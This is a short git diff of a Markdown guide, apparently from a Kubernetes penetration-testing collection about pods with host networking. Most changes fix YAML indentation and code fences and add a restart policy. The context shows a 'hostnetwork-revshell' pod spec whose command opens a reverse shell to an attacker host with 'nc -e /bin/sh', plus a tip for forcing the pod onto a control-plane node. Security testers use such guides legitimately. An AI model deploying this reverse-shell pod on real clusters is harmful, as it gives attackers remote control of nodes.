@@ -22,7 +22,8 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
     name: hostnetwork
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  ```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+  ```
 [pod-hostnetwork.yaml](pod-hostnetwork.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -55,7 +56,9 @@ spec:
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     name: hostnetwork-revshell
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name```
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
+  restartPolicy: Always
+  ```
 [pod-hostnetwork-revshell.yaml](pod-hostnetwork-revshell.yaml)
 
 #### Set up listener
